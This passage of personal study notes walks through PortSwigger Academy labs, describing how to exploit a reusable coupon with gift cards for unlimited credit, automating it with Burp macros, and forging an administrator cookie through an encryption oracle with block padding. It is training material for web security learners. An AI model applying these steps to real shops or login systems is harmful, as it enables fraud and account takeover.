        - takeaway : when u have a multi-step process and your goal is to access admin functionality, try to access admin feature with each cookie that u get in the process
    - Infinite money logic flaw
        - lab link
            
            [https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-infinite-money)
            
        - by signing up to the newsletter, we get a coupon
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20699.png)
            
        - since, we see a feature of redeeming (re-acheter/rembourser) gift card code, we need to think of a way to exploit that
        - a tricky thing here is that we can reuse the coupon for every purrshase
        - so we combine the previous 2 elements :
        - we buy a gift card with 10$, we use a coupon to make it 7$, pay, redeem the card code, end up gaining 3$ !!
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20700.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20701.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20702.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20703.png)
            
        - Now the we have a way to increase our balance, we need to automate this
        - That’s when session handling rules comes into play
            - this feature enables us to make burp perform some action when making http requests (i guess by default when making them in repeater and intruder only)
            - there is a Scope tab in each session handling rule where you control which tools the rule applies to
            - this can be handy for example if we have an app that logs us out very quickly
            - and of course it’s also handy in this case (easier/faster than writing a python script)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20704.png)
            
        - no need to follow written steps when you can follow a youtube video
            
            [https://youtu.be/3pqYcbnAHtY](https://youtu.be/3pqYcbnAHtY)
            
            - Note that the CSRF value doesn’t change in the session
            - the only value that would change each time is the gift card code
            - to automate the process, we only use the necessary requests that perform actions which are the following 5 requests below
            - this rule which contain this macro(sequence of request) will be executed after each request, so we only have to do a GET many times and our balance wil start to increase
            - Lightweight "l33t" Leather Jacket costs 1337$ and my current balance is 103$, and we gain 3$ after each iteration
            - so we have to perform 412 requests in intruder because (1337 - 103)/3= 411,33 => 412
            - An important detail is that we must use 1 thread, otherwise our balance will start decreasing because things in the cart will get messed up, you will have a lof of products and not one
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20705.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20706.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20707.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20708.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20709.png)
                
    - Authentication bypass via encryption oracle
        - lab link
            
            [https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
            
        - Notice that this lab contain a “stay logged in” feature that adds a cookie that can authenticate us in the app
        - Notice that when we make an error in the email while posting a comment, we’ll see an error message and the request will include an extra cookie called notification
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20710.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20711.png)
            
        - since the requests printing the error message contains a cookie named notification with a value that looks encrypted, we suggest that the cookie contains the exact encrypted value of the message
        - we try to to put the encrypted value in the cookie notification and check if the backend will decrypt the value. We use the value from the stay-logged-in cookie
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20712.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20713.png)
            
        - so now we have a way to decrypt data
        - if the cookie contains `wiener:timestamp` we should aim for having a cookie with the value `administrator:timestamp`
        - since what we insert in the email part gets reflected, we kind of have a way to encrypt data too  but  the string `Invalid email address:`  is appended in the beginning
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20714.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20715.png)
            
        - Next, we take the encrypted value in the cookie notification, url decode it, base64 decode it
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20716.png)
            
            - s
        - since the string  `Invalid email address:`  contains 23 character, and each character takes one byte, we are going to delete 23 first bytes from the previous output
            - we can verify this with the tool `wc`
            - pay attention that if you add the string to a file it will add one to the count.This is because the "wc" command includes the newline character “\n” at the end of the line that was added to the file.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20717.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20718.png)
            
        - so we decode the cookie, delete the first 23 bytes, and re-encode it
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20719.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20720.png)
            
        - when we try to decrypt this value, we get the following error which indicates that a block-based encryption algorithm is used and that the input length must be a multiple of 16.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20721.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20722.png)
            
        - i guess it makes sense that if we encrypt each block of 16 bytes, to remove blocks of 16 so that we ended up with a value that starts with “administrator” (that’s how i understood it)
        - In other words, there is a padding problem because the part that we deleted wasn’t a multiple of 16.
            
            i guess that’s why when we deleted bytes previously we ended up with a number of bytes which is not multiple of 16 (since every line contains 16 bytes) 
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20720.png)
            
        - So we need to pad the "`Invalid email address:` " prefix with enough bytes so that the number of bytes you will remove is a multiple of 16. it’s 9 bytes (23+9 =32)
        - we can do this by adding adding 9 characters to the start of the intended cookie value, for example : `xxxxxxxxxadministrator:your-timestamp`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20723.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20724.png)
            
        - we decode the generate value, delete 32 bytes,
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20725.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20726.png)
            
        - using the decrypt request, we can verify that out have the cookie value is good
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20727.png)
            
        - So, we use that value in the cookie stay-logged-in to access /admin and delete carlos
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20728.png)